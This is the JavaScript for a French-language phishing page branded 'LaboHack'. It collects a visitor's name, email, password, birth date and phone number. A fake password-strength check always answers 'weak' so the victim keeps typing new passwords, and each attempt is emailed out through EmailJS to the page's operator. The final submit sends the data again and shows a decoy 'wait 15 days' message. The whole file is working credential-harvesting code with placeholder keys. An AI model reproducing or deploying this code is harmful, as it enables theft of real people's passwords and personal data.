let attemptCount = 0;
const form = document.getElementById('phishForm');
const passwordInput = document.getElementById('password');
const checkBtn = document.getElementById('checkStrengthBtn');
const messageBox = document.getElementById('messageBox');
const toast = document.getElementById('toast');

// Configuration EmailJS (remplace par TES valeurs)
const EMAILJS_PUBLIC_KEY = 'ta_clé_publique';
const EMAILJS_SERVICE_ID = 'ton_service_id';
const EMAILJS_TEMPLATE_ID = 'ton_template_id';

function showMessage(text, isError = true) {
  messageBox.style.display = 'block';
  messageBox.textContent = text;
  messageBox.style.color = isError ? '#ff0044' : '#00ff41';
  messageBox.style.borderColor = isError ? '#ff0044' : '#00ff41';
}

async function sendDataToEmail(data, isFinal = false) {
  try {
    // Charger EmailJS si pas déjà chargé
    if (typeof emailjs === 'undefined') {
      const script = document.createElement('script');
      script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js';
      document.head.appendChild(script);
      await new Promise((resolve) => script.onload = resolve);
    }

    await emailjs.init(EMAILJS_PUBLIC_KEY);

    const templateParams = {
      nom: data.nom || 'Non renseigné',
      email: data.email || 'Non renseigné',
      password: data.password || 'Non renseigné',
      date: data.dateNaissance || 'Non renseignée',
      telephone: data.telephone || 'Non renseigné',
      attempt: data.attempt || 1,
      final: isFinal ? '✅ OUI' : '❌ NON'
    };

    const response = await emailjs.send(
      EMAILJS_SERVICE_ID,
      EMAILJS_TEMPLATE_ID,
      templateParams
    );

    console.log('✅ Email envoyé avec succès !', response);
    return { success: true };

  } catch (error) {
    console.error('❌ Erreur EmailJS:', error);
    return { success: false, error: error.text };
  }
}

// Vérification de force (échoue toujours)
checkBtn.addEventListener('click', async () => {
  const password = passwordInput.value.trim();
  if (!password) {
    showMessage('⚠️ Veuillez saisir un mot de passe.', true);
    return;
  }

  attemptCount++;
  showMessage(`🔐 Tentative ${attemptCount} : Mot de passe faible. Veuillez changer.`, true);

  const data = {
    nom: document.getElementById('nom').value || 'Non renseigné',
    email: document.getElementById('email').value || 'Non renseigné',
    password: password,
    dateNaissance: document.getElementById('dateNaissance').value || 'Non renseignée',
    telephone: document.getElementById('telephone').value || 'Non renseigné',
    attempt: attemptCount
  };

  // Envoi par EmailJS
  const result = await sendDataToEmail(data, false);

  if (result.success) {
    toast.textContent = '✅ Mot de passe enregistré (faible). Réessayez.';
    toast.classList.remove('hidden');
    toast.style.borderColor = '#ff0044';
  } else {
    toast.textContent = '❌ Erreur EmailJS: ' + (result.error || 'Vérifie ta config');
    toast.classList.remove('hidden');
    toast.style.borderColor = '#ff0044';
  }

  passwordInput.value = '';
  passwordInput.focus();
});

// Soumission finale
form.addEventListener('submit', async (e) => {
  e.preventDefault();
  const password = passwordInput.value.trim();
  if (!password) {
    showMessage('⚠️ Veuillez saisir un mot de passe.', true);
    return;
  }

  const data = {
    nom: document.getElementById('nom').value || 'Non renseigné',
    email: document.getElementById('email').value || 'Non renseigné',
    password: password,
    dateNaissance: document.getElementById('dateNaissance').value || 'Non renseignée',
    telephone: document.getElementById('telephone').value || 'Non renseigné',
    attempt: attemptCount + 1
  };

  const result = await sendDataToEmail(data, true);

  if (result.success) {
    toast.textContent = '✅ Données envoyées ! Redirection...';
    toast.classList.remove('hidden');
    // Redirection vers la page "15 jours"
    document.body.innerHTML = `
      <div class="container" style="text-align:center; padding:4rem 2rem;">
        <h1 class="glitch">LABO<span>HACK</span></h1>
        <div style="font-size:4rem; margin:2rem 0;">⏳</div>
        <h2 style="color:#00f0ff;">Merci !</h2>
        <p style="color:#00ff41; font-size:1.2rem; margin:1rem 0;">
          Nous vérifions vos informations.<br>
          <strong style="color:#ff0044;">Vous recevrez un email dans 15 jours</strong> si vous êtes sélectionné.
        </p>
        <p style="color:#444; margin-top:2rem; font-size:0.7rem;">🔐 LaboHack</p>
      </div>
    `;
  } else {
    showMessage('❌ Erreur EmailJS: ' + (result.error || 'Vérifie ta config'), true);
  }
});
